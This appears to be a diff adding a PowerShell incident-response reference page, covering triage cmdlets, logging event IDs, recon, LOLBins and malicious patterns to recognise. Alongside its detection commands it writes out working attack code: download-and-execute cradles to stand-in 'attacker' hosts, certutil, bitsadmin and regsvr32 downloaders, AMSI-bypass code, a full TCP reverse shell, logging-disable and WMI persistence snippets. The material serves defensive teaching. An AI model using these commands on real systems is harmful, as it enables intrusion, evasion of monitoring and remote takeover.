@@ -1,0 +1,859 @@
+<h1>Windows PowerShell</h1>
+
+<p class="section-intro">
+    PowerShell is where almost every modern attack leaves fingerprints.  
+    It's also the strongest DFIR tool on Windows when you know what to ask it.  
+    This section covers real investigation commands, logging, abuse patterns, 
+    and techniques defenders + attackers actually use.
+</p>
+
+
+<!-- SECTION 1: Core Cmdlets for DFIR -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ps-core')">
+        1. Core Cmdlets (DFIR Essentials)
+    </div>
+    <div class="tool-details" id="ps-core">
+
+<pre>
+# --- Process Triage ---
+Get-Process | Sort CPU -Descending
+    # Quick "what's burning CPU" view
+    # Malware often spikes or keeps steady CPU on compromised hosts
+
+Get-Process | Select Name,Id,Path
+    # Path column instantly exposes:
+    #   - unsigned binaries in AppData
+    #   - fake svchost.exe
+    #   - temp-folder droppers
+
+
+# --- Service Triage ---
+Get-Service | Where-Object { $_.Status -eq "Running" }
+    # Look for non-Microsoft services running unexpectedly
+
+Get-CimInstance Win32_Service |
+    Select Name, StartMode, PathName |
+    Sort Name
+    # If PathName is in:
+    #   C:\Users\
+    #   AppData\
+    #   ProgramData\
+    #   Temp\
+    #   → massive red flag
+
+
+# --- Log Triage ---
+Get-EventLog -LogName System -Newest 30
+Get-EventLog -LogName Application -Newest 30
+
+# Modern: better, faster, cleaner
+Get-WinEvent -LogName Security -MaxEvents 50 |
+    Select TimeCreated,Id,Message
+
+
+# --- User Enumeration ---
+Get-LocalUser
+Get-LocalGroupMember Administrators
+    # Find unexpected local admins (common foothold)
+
+
+# --- File Triage ---
+Get-ChildItem C:\Users -Recurse -ErrorAction SilentlyContinue |
+    Select Name, FullName, Length, LastWriteTime |
+    Sort LastWriteTime -Descending
+
+# Look for recently dropped binaries:
+Get-ChildItem -Recurse C:\ -Include *.exe,*.dll -ErrorAction SilentlyContinue |
+    Where-Object { $_.LastWriteTime -gt (Get-Date).AddHours(-24) }
+
+
+# --- Network Triage ---
+Get-NetTCPConnection |
+    Select LocalPort,RemoteAddress,State,OwningProcess
+
+
+# --- Environment (attackers abuse this) ---
+Get-ChildItem Env:
+    # Check:
+    #   - PSModulePath (malicious modules)
+    #   - TEMP (dropper locations)
+    #   - PATH hijacks
+
+
+# --- Installed software (great for baseline) ---
+Get-CimInstance Win32_Product |
+    Select Name, Version, InstallDate
+    # Slow but good for artifact discovery
+</pre>
+
+<p><b>Why this section matters:</b></p>
+<ul>
+    <li>This is the "10-second read" of a live system when you first connect.</li>
+    <li>Shows processes, services, logs, and suspicious locations instantly.</li>
+    <li>Lets you confirm if the machine is stable enough for deeper forensics.</li>
+    <li>Gives you a safe triage path before you start dumping memory or logs.</li>
+    <li>Covers where malware hides during the first stages of an intrusion.</li>
+</ul>
+
+<p>
+Think of this as the Windows equivalent of running:  
+<b>ps aux → netstat → ls -latr → dmesg → journalctl</b>  
+but all in one PowerShell-driven pass.
+</p>
+
+    </div>
+</div>
+
+
+<!-- SECTION 2: Logging & Script Block Events -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ps-logging')">
+        2. PowerShell Logging (4103, 4104, 4105)
+    </div>
+    <div class="tool-details" id="ps-logging">
+
+<pre>
+# --- View raw PowerShell logs (best starting point) ---
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 50 |
+    Select TimeCreated, Id, Message
+
+
+# --- Script Block Logging (Event ID 4104) ---
+# Shows the EXACT commands executed, even encoded/obfuscated ones.
+Get-WinEvent -FilterHashtable @{
+    LogName='Microsoft-Windows-PowerShell/Operational';
+    Id=4104
+} | Select TimeCreated, Message
+
+
+# --- Pipeline Execution Logging (Event ID 4103) ---
+# Shows when commands were piped or chained.
+Get-WinEvent -FilterHashtable @{
+    LogName='Microsoft-Windows-PowerShell/Operational';
+    Id=4103
+} | Select TimeCreated, Message
+
+
+# --- Module Loading (4105 / 4106) ---
+# Useful to catch malicious imported modules or ADS-hosted modules.
+Get-WinEvent -FilterHashtable @{
+    LogName='Microsoft-Windows-PowerShell/Operational';
+    Id=4105
+} | Select TimeCreated, Message
+
+
+# --- Search PowerShell logs for encoded commands ---
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
+    Where-Object { $_.Message -match "-enc " } |
+    Select TimeCreated, Message
+
+
+# --- Detect download + execute behavior ---
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
+    Where-Object { $_.Message -match "DownloadString|IEX|Invoke-Expression" } |
+    Select TimeCreated, Message
+
+
+# --- Detect attempts to disable logging (very common) ---
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
+    Where-Object { $_.Message -match "Logging" -or $_.Message -match "ScriptBlock" }
+
+
+# --- Convert logs to readable summary ---
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 200 |
+    Select TimeCreated,Id,@{N='Cmd';E={($_.Message -split "`n")[0]}}
+</pre>
+
+<p><b>What these logs reveal:</b></p>
+<ul>
+    <li>Every PowerShell command an attacker executed - even if fileless.</li>
+    <li>Decoded script block contents when they used -enc Base64 payloads.</li>
+    <li>Imported modules (4105) - key for detecting malicious modules.</li>
+    <li>Attempts to disable PowerShell logging or AMSI.</li>
+    <li>Download → decode → execute patterns.</li>
+</ul>
+
+<p><b>Events you MUST memorize:</b></p>
+<ul>
+    <li><b>4104 - Script Block Logging</b> (the goldmine)</li>
+    <li><b>4103 - Pipeline Execution</b></li>
+    <li><b>4105 / 4106 - Module Loading</b></li>
+    <li><b>4688 - Process creation with command line</b> (Security log)</li>
+</ul>
+
+<p>
+Most real-world intrusions can be reconstructed almost entirely from PowerShell logs alone - if logging wasn't tampered with.
+</p>
+
+    </div>
+</div>
+
+
+<!-- SECTION 3: Execution Policies & Bypass -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ps-execpol')">
+        3. Execution Policies & Common Bypasses
+    </div>
+    <div class="tool-details" id="ps-execpol">
+
+<pre>
+# --- View all active execution policies ---
+Get-ExecutionPolicy -List
+    # Shows LocalMachine, CurrentUser, Process, etc.
+    # Important: Execution Policy is NOT a security boundary.
+
+
+# --- Set a temporary policy for your own session (safe for IR) ---
+Set-ExecutionPolicy Bypass -Scope Process
+    # Does NOT persist. Good for investigations.
+
+
+# --- Check if an attacker modified global policies ---
+Get-ItemProperty HKLM:\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell
+Get-ItemProperty HKCU:\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell
+    # Attackers often set:
+    #   ExecutionPolicy = Unrestricted
+    #   EnableScripts   = 1
+
+
+# --- Common attacker bypasses you'll see in the wild ---
+
+# 1. Bypass via -ExecutionPolicy
+powershell.exe -ExecutionPolicy Bypass -File script.ps1
+
+# 2. Using encoded commands
+powershell.exe -NoProfile -EncodedCommand <base64>
+
+# 3. Using command invocation
+powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://host/payload')"
+
+# 4. Using hidden windows
+powershell.exe -WindowStyle Hidden -c "<malicious code>"
+
+# 5. Bypass via environment (PSModulePath hijack)
+$env:PSModulePath += ";C:\Users\Public\Modules"
+
+
+# --- Pure PowerShell in-memory execution ---
+# Download and execute without touching disk
+iex (iwr http://attacker/payload.ps1 -UseBasicParsing)
+
+# Or using shorter aliases:
+IEX (New-Object Net.WebClient).DownloadString("http://attacker/p.ps1")
+
+
+# --- AMSI bypass attempts (very common in modern malware) ---
+# Look for these indicators in logs:
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') |
+    Get-Member
+
+# Or attempts to patch AMSI function:
+$code = '[DllImport("amsi.dll")] public static extern void AmsiScanBuffer(...)'
+
+
+# --- Detect execution-policy tampering in logs ---
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
+    Where-Object { $_.Message -match "ExecutionPolicy" }
+</pre>
+
+<p><b>Why this matters:</b></p>
+<ul>
+    <li>ExecutionPolicy is *not* a security boundary - attackers ignore it.</li>
+    <li>Bypasses (encoded, IEX, download cradle) show up constantly in intrusions.</li>
+    <li>Registry inspection reveals persistent policy tampering.</li>
+    <li>AMSI bypass attempts are a smoking gun for active in-memory execution.</li>
+    <li>DFIR analysts use <code>-Scope Process</code> to safely run tools without changing system state.</li>
+</ul>
+
+<p>
+This section gives you the exact patterns to recognize when PowerShell is being abused -  
+which is basically every modern Windows intrusion.
+</p>
+
+    </div>
+</div>
+
+
+<!-- SECTION 4: Recon & Enumeration -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ps-recon')">
+        4. Recon & Enumeration (Attacker + IR)
+    </div>
+    <div class="tool-details" id="ps-recon">
+
+<pre>
+# --- Users & Privileges ---
+Get-LocalUser
+Get-LocalGroup
+Get-LocalGroupMember Administrators
+    # Instantly shows unexpected local admins.
+
+whoami /all
+    # Shows all tokens, groups, privileges (gold for privilege escalation).
+
+
+# --- OS & System Info ---
+Get-ComputerInfo | Select WindowsVersion,OsName,OsArchitecture
+Get-WmiObject Win32_OperatingSystem | Select Caption,Version,BuildNumber
+
+systeminfo | findstr /i "hotfix KB patch"
+    # Missing patches = exploit opportunities.
+
+
+# --- Installed Software ---
+Get-CimInstance Win32_Product |
+    Select Name,Version,InstallDate
+    # Look for remote-access tools, coin miners, "helper" programs.
+
+
+# --- Running Services (possible PrivEsc vectors) ---
+Get-CimInstance Win32_Service |
+    Select Name,StartMode,State,PathName |
+    Sort Name
+    # Services with writable paths or installed in AppData = red flag.
+
+
+# --- Startup Items (classic persistence check) ---
+Get-CimInstance Win32_StartupCommand |
+    Select Name,Command,Location
+
+
+# --- Network Shares (attacker recon pattern) ---
+Get-SmbShare
+Get-SmbMapping
+net use
+
+
+# --- Network & Domain Discovery ---
+ipconfig /all
+Get-NetAdapter
+Get-NetIPAddress
+Get-DnsClientServerAddress
+
+# Domain info (if joined)
+Get-WmiObject Win32_ComputerSystem | Select Domain,PartOfDomain
+Get-ADDomain | Select DistinguishedName,DomainMode   # if AD tools available
+
+
+# --- Logged-in users (active sessions) ---
+quser
+qwinsta
+query user
+
+
+# --- Processes & Command Lines (deep recon) ---
+Get-CimInstance Win32_Process |
+    Select Name,ProcessId,ParentProcessId,CommandLine |
+    Sort Name
+    # This exposes malicious one-liners immediately.
+
+
+# --- Environment & Execution Context ---
+Get-ChildItem Env:
+$PSVersionTable
+Get-CimInstance Win32_ComputerSystem | Select Manufacturer,Model
+    # Useful for spotting VMs, sandboxes, or real hardware.
+
+
+# --- Filesystem scanning (attacker & defender favorite) ---
+# Scan common dropper paths
+Get-ChildItem "$env:APPDATA","C:\ProgramData","$env:TEMP" -Recurse |
+    Where-Object { $_.Extension -in ".exe",".dll",".ps1",".vbs",".js" }
+
+# Large files (dumps, logs, staging areas)
+Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue |
+    Sort Length -Descending | Select -First 15
+</pre>
+
+<p><b>Why this matters:</b></p>
+<ul>
+    <li>Attackers perform recon the moment they land - these commands mimic that.</li>
+    <li>IR uses the same recon to map privileges, persistence, and attack surface.</li>
+    <li>Process command lines reveal malware activity before logs even load.</li>
+    <li>Domain & network info confirms lateral movement potential.</li>
+    <li>Startup, services, and environment variables expose hidden footholds.</li>
+</ul>
+
+<p>
+This is the Windows equivalent of “enumerate everything you can touch” -  
+the exact recon patterns used in red teaming, malware staging, and incident response.
+</p>
+
+    </div>
+</div>
+
+
+<!-- SECTION 5: Network & Remote Ops -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ps-network')">
+        5. Network & Remote Operations
+    </div>
+    <div class="tool-details" id="ps-network">
+
+<pre>
+# --- Live TCP connections (cleaner than netstat) ---
+Get-NetTCPConnection |
+    Select LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess |
+    Sort-Object RemoteAddress
+
+
+# --- Quickly map PID → process name ---
+Get-NetTCPConnection | ForEach-Object {
+    $p = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
+    [PSCustomObject]@{
+        Process = $p.Name
+        PID     = $_.OwningProcess
+        Remote  = $_.RemoteAddress
+        RPort   = $_.RemotePort
+        State   = $_.State
+    }
+} | Sort Process
+
+
+# --- DNS test / domain reachability (C2 check) ---
+Test-NetConnection google.com
+Test-NetConnection -Port 443 github.com
+
+
+# --- Quick port scanning (PowerShell-native) ---
+1..1024 | ForEach-Object {
+    Test-NetConnection -Port $_ -ComputerName localhost
+}
+
+
+# --- SMB sessions (gold for lateral movement detection) ---
+Get-SmbSession | Select ClientComputerName,UserName,NumOpens
+Get-SmbOpenFile
+
+
+# --- Remote host info (WinRM or PSRemoting) ---
+Test-WSMan SERVER01
+Enter-PSSession SERVER01
+Invoke-Command -ComputerName SERVER01 -ScriptBlock { Get-Process }
+
+
+# --- Copy files to remote host ---
+Copy-Item .\payload.exe -Destination \\TARGET\C$\Users\Public
+
+
+# --- Using WMI for remote execution (common attacker trick) ---
+Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName TARGET -ArgumentList "cmd.exe /c whoami"
+
+
+# --- Remote scheduled task creation ---
+Invoke-Command -ComputerName TARGET -ScriptBlock {
+    schtasks /create /tn EvilBackdoor /tr "cmd.exe /c calc.exe" /sc onlogon
+}
+
+
+# --- Query firewall rules ---
+Get-NetFirewallRule | Select DisplayName,Enabled,Direction,Action
+
+
+# --- Find blocked outbound connections (useful for detecting malware failing) ---
+Get-WinEvent -LogName "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall" |
+    Where-Object { $_.Message -match "Block" }
+</pre>
+
+<p><b>Why this matters:</b></p>
+<ul>
+    <li>95% of lateral movement uses SMB, WinRM, PSRemoting, WMI, or RDP.</li>
+    <li>Mapping TCP connections with PIDs is critical for spotting RATs and C2.</li>
+    <li>Firewall logs reveal failed beacon attempts that netstat misses.</li>
+    <li>PSRemoting + WMI execution is how many real attackers “live off the land.”</li>
+    <li>Defenders use these same commands to validate containment and trace pivots.</li>
+</ul>
+
+<p>
+This is the Windows equivalent of “netstat + lsof + nmap + ssh” -  
+all baked into PowerShell with native visibility attackers rely on.
+</p>
+
+    </div>
+</div>
+
+
+<!-- SECTION 6: Fileless Execution & LOLBins -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ps-lolbins')">
+        6. Fileless Execution & LOLBins
+    </div>
+    <div class="tool-details" id="ps-lolbins">
+
+<pre>
+# --- Classic fileless execution pattern ---
+IEX (New-Object Net.WebClient).DownloadString("http://attacker/payload.ps1")
+    # → No file on disk. Everything runs in memory.
+
+
+# --- Encoded payload execution (very common in real intrusions) ---
+powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <base64>
+    # Look for:
+    #   dABlAHMAdAAg (base64 for "test")
+    #   SQBFAFgAIAAo (IEX)
+    #   TmV3LU9iamVjdA (New-Object)
+
+
+# --- Using compressed payloads ---
+# Attackers sometimes hide payloads inside GZip streams
+$bytes = [IO.Compression.GzipStream]::new(...)
+
+
+# --- AMSI bypass attempts (fileless malware signature #1) ---
+# Patch AMSI in memory
+$Ref = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
+$Field = $Ref.GetField("amsiInitFailed","NonPublic,Static")
+$Field.SetValue($null,$true)
+    # This is a massive red flag in scriptblock logs (4104).
+
+
+# --- WMI-based fileless execution ---
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -enc <payload>"
+    # No file written, execution happens remotely/in-memory.
+
+
+# --- MSHTA (LOLBIN) ---
+mshta.exe "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Run('powershell -enc <payload>');close();"
+    # Attackers love this binary because it's signed by Microsoft.
+
+
+# --- Rundll32 fileless trick ---
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write('<script>powershell -enc <payload></script>')
+    # Runs PowerShell from a JS engine using a signed Microsoft binary.
+
+
+# --- Regsvr32 / "Squiblydoo" technique ---
+regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll
+    # Executes remote scriptlet file with no file drop.
+
+
+# --- WScript / CScript loaders ---
+wscript.exe evil.js
+cscript.exe payload.vbs
+    # Used for staging second-stage PowerShell.
+
+
+# --- Living-off-the-land downloaders ---
+certutil.exe -urlcache -split -f http://attacker/payload.exe out.exe
+bitsadmin /transfer myjob http://attacker/payload.exe out.exe
+Invoke-WebRequest http://attacker/p.ps1 -OutFile p.ps1
+    # Immediately check logs for these.
+
+
+# --- "No file touches disk" execution check ---
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
+    Where-Object { $_.Message -match "IEX" -or $_.Message -match "DownloadString" }
+</pre>
+
+<p><b>Why this matters:</b></p>
+<ul>
+    <li>This is the backbone of every modern *fileless* malware attack.</li>
+    <li>IEX, encoded payloads, and WMI execution appear in nearly every breach.</li>
+    <li>Regsvr32, mshta, rundll32, and powershell.exe are the top LOLBins abused today.</li>
+    <li>AMSI bypass attempts are practically a guarantee of malicious intent.</li>
+    <li>You can detect all of this through script block logging and process command lines.</li>
+</ul>
+
+<p>
+If PowerShell is being abused, it will almost always look like something in this list.  
+This section gives you instant pattern recognition during IR.
+</p>
+
+    </div>
+</div>
+
+
+<!-- SECTION 7: PowerShell History & Artifact Recovery -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ps-history')">
+        7. History, Transcripts & Artifact Recovery
+    </div>
+    <div class="tool-details" id="ps-history">
+
+<pre>
+# --- PowerShell console history (the obvious one) ---
+Get-History
+(Get-History).CommandLine
+
+# Full file:
+type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+    # Attackers *rarely* remember to wipe this.
+    # Contains plaintext commands, creds, URLs, C2 hosts.
+
+
+# --- PSReadLine dump (better parsing) ---
+(Get-Content (Get-PSReadlineOption).HistorySavePath)
+
+
+# --- PowerShell transcripts (if enabled) ---
+# These capture FULL input/output of the PowerShell session.
+Get-ChildItem "C:\Users\*\Documents\PowerShell_transcript*"
+
+# Transcripts contain:
+#   - decoded payloads
+#   - commands
+#   - output of executed code
+#   - errors (pure gold for DFIR)
+
+
+# --- PowerShell crash logs (rare but extremely valuable) ---
+Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\CrashLogs"
+
+
+# --- AMSI logs (Anti-Malware Scan Interface) ---
+# AMSI sees decoded content BEFORE execution.
+Get-WinEvent -LogName "Microsoft-Windows-Antimalware-Scan-Interface/Operational" -MaxEvents 50 |
+    Select TimeCreated, Message
+
+
+# --- Script Block Logging (the goldmine) ---
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 200 |
+    Where-Object { $_.Id -eq 4104 } |
+    Select TimeCreated, Message
+
+
+# --- Reconstruct complete session timeline ---
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 300 |
+    Select TimeCreated, Id, @{N='Preview';E={($_.Message -split "`n")[0]}} |
+    Sort TimeCreated
+
+
+# --- Look for attempts to wipe history ---
+Select-String -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" `
+    -Pattern "Clear-History","Remove-Item","history","Set-PSReadLineOption"
+
+# If attackers ran:
+Clear-History
+Remove-Item (Get-PSReadlineOption).HistorySavePath
+
+# …that's logged too.
+
+
+# --- Recover deleted history (still on disk) ---
+# Many times attackers delete the file, but MFT/USN Journal brings it back.
+# Just a placeholder for now:
+#   MFTECmd.exe -f $MFT --csv out.csv
+#   UsnJrnlParser.exe C:
+</pre>
+
+<p><b>What this reveals:</b></p>
+<ul>
+    <li>The exact commands the attacker typed.</li>
+    <li>Decoded payloads even if they only ran encoded commands.</li>
+    <li>Errors and typos (shows intent + failed attempts).</li>
+    <li>AMSI logs that catch malicious strings before execution.</li>
+    <li>Transcripts with complete session input/output.</li>
+    <li>Evidence of attempts to wipe logs or history.</li>
+</ul>
+
+<p>
+PowerShell almost always betrays the attacker.  
+Even “fileless” operations leave a trail - and this section shows how to pull every last artifact out of it.
+</p>
+
+    </div>
+</div>
+
+
+<!-- SECTION 8: PowerShell Defensive Toolkit -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ps-defense')">
+        8. DFIR / Defensive PowerShell Toolkit
+    </div>
+    <div class="tool-details" id="ps-defense">
+
+<pre>
+# --- Process creation logs (Security 4688) ---
+Get-WinEvent -FilterHashtable @{
+    LogName='Security';
+    Id=4688
+} -MaxEvents 50 |
+Select TimeCreated, @{N='Cmd';E={($_.Message -split "`n")[0]}}
+
+
+# --- Correlate process → command line ---
+Get-CimInstance Win32_Process |
+    Select Name,ProcessId,ParentProcessId,CommandLine |
+    Sort Name
+
+
+# --- Safe collection of suspicious binaries ---
+# Copy files without touching timestamps
+Copy-Item suspect.exe -Destination E:\evidence\ -Force -ErrorAction SilentlyContinue
+
+
+# --- Hash all executable files in common malware paths ---
+Get-ChildItem "$env:APPDATA","C:\ProgramData","$env:TEMP" -Recurse -ErrorAction SilentlyContinue |
+    Where-Object { $_.Extension -in ".exe",".dll",".ps1",".vbs" } |
+    ForEach-Object {
+        [PSCustomObject]@{
+            File = $_.FullName
+            Hash = (Get-FileHash $_.FullName -Algorithm SHA256).Hash
+        }
+    }
+
+
+# --- Defender Logs for quick malware hits ---
+Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 50 |
+    Select TimeCreated,Id,Message
+
+
+# --- Build a quick IOC extractor ---
+# Pull IPs from logs
+Get-WinEvent -LogName Security -MaxEvents 500 |
+    Select -ExpandProperty Message |
+    Select-String -Pattern "\b\d{1,3}(\.\d{1,3}){3}\b" |
+    Select Line | Sort Line -Unique
+
+
+# --- Active network monitoring loop (simple beacon catcher) ---
+while ($true) {
+    Get-NetTCPConnection | Where-Object { $_.State -eq "Established" }
+    Start-Sleep 3
+}
+
+
+# --- Snap system state for offline analysis ---
+$state = [PSCustomObject]@{
+    Processes = Get-Process
+    Services  = Get-Service
+    TCP       = Get-NetTCPConnection
+    Users     = Get-LocalUser
+}
+$state | Export-Clixml ".\system_state.xml"
+    # XML preserves fidelity for IR rehydration.
+
+
+# --- Find blocked malicious outbound connections ---
+Get-WinEvent -LogName "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall" |
+    Where-Object { $_.Message -match "Block" }
+
+
+# --- Quick malware hunting: decode Base64 payloads ---
+# DFIR trick - decode suspicious strings on the fly:
+[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("<base64>"))
+</pre>
+
+<p><b>Why this matters:</b></p>
+<ul>
+    <li>Process creation logs (4688) are the backbone of host-based DFIR.</li>
+    <li>Clixml snapshots allow clean state review without touching the system again.</li>
+    <li>Hashing suspicious directories reveals droppers and side-loaders fast.</li>
+    <li>Firewall logs catch C2 attempts even when connections fail.</li>
+    <li>IOC extraction pipelines turn chaos into actionable indicators.</li>
+</ul>
+
+<p>
+This is the “defender's PowerShell.”  
+When you need fast visibility, high-fidelity evidence, and safe triage - these commands are your go-to.
+</p>
+
+    </div>
+</div>
+
+
+<!-- SECTION 9: Attacker Techniques to Recognize -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ps-malicious')">
+        9. Common Malicious PowerShell Techniques to Recognize
+    </div>
+    <div class="tool-details" id="ps-malicious">
+
+<pre>
+# --- Base64 execution (most common obfuscation pattern) ---
+powershell -enc <Base64String>
+# Red flag: long base64 strings, often UTF-16 encoded.
+
+
+# --- Download & execute (classic dropper) ---
+iex (New-Object Net.WebClient).DownloadString("http://malicious/payload.ps1")
+
+# Modern variant:
+iwr http://malicious/payload.ps1 | iex
+
+
+# --- Fileless execution using reflection ---
+[System.Reflection.Assembly]::Load([Convert]::FromBase64String("<blob>"))
+
+# Malware loads DLLs / shellcode directly from memory.
+
+
+# --- Living-off-the-land (LOLBin substitution) ---
+# Attackers use built-ins to avoid detection:
+$sc = New-Object Net.Sockets.TCPClient("attacker",4444)
+$stream = $sc.GetStream()
+[byte[]]$buf = 0..65535 | % {0}
+while(($i = $stream.Read($buf,0,$buf.Length)) -ne 0){
+    $data = (New-Object Text.UTF8Encoding).GetString($buf,0,$i)
+    $send = (iex $data 2>&1 | Out-String)
+    $send2 = ([text.encoding]::UTF8).GetBytes($send)
+    $stream.Write($send2,0,$send2.Length)
+}
+
+# Result: full remote shell.
+
+
+# --- Script block logging evasion ---
+Set-ItemProperty HKLM:\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell `
+    -Name "ScriptBlockLogging" -Value 0 -Force
+
+# If this is modified → someone is hiding activity.
+
+
+# --- AMSI bypass (classic one-liner families) ---
+$A=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$F=$A.GetField('amsiInitFailed','NonPublic,Static')
+$F.SetValue($null,$true)
+
+# Anything touching AmsiUtils or amsiInitFailed = immediate red flag.
+
+
+# --- WMI-based persistence (fileless) ---
+$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
+    -Arguments @{Name='wf'; EventNamespace='root\cimv2';
+    QueryLanguage="WQL"; Query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'"}
+
+# Malware often binds a consumer to launch payloads on events.
+
+
+# --- PowerShell encoded command split across variables ---
+$a="powershell -enc "; $b="<base64>"; iex ($a+$b)
+# Obfuscation-by-concatenation is everywhere.
+
+
+# --- Suspicious string-building tricks ---
+$p="p"+"ower"+"shell"
+$cmd = $p + " -enc " + $encoded
+
+# Attackers avoid static signatures by splitting keywords.
+
+
+# --- Downloads hidden via headers or user-agents ---
+iwr -Uri "http://bad" -Headers @{UA="Mozilla/5.0"; API="secret"} | iex
+
+
+# --- Registry-based payload storage (no files used) ---
+$payload = (Get-ItemProperty -Path HKCU:\Software\Bad -Name Data).Data
+iex $payload
+</pre>
+
+<p><b>What to look for immediately:</b></p>
+<ul>
+    <li><code>-enc</code> on anything → guaranteed suspicious.</li>
+    <li><code>iex</code>, <code>Invoke-Expression</code>, or <code>DownloadString</code>.</li>
+    <li>AmsiUtils modifications → malware trying to stay invisible.</li>
+    <li>WMI __EventFilter or __EventConsumer creation.</li>
+    <li>Long Base64 blobs, especially UTF-16 encoded.</li>
+    <li>Reflection loading → PowerShell → memory → shellcode.</li>
+    <li>String concatenation building commands (“p"+"ower"+"sh"+"ell”).</li>
+</ul>
+
+<p>
+PowerShell malware isn't creative - it's predictable.  
+Learn these patterns and you'll recognize 90% of malicious scripts instantly.
+</p>
+
+    </div>
+</div>
+
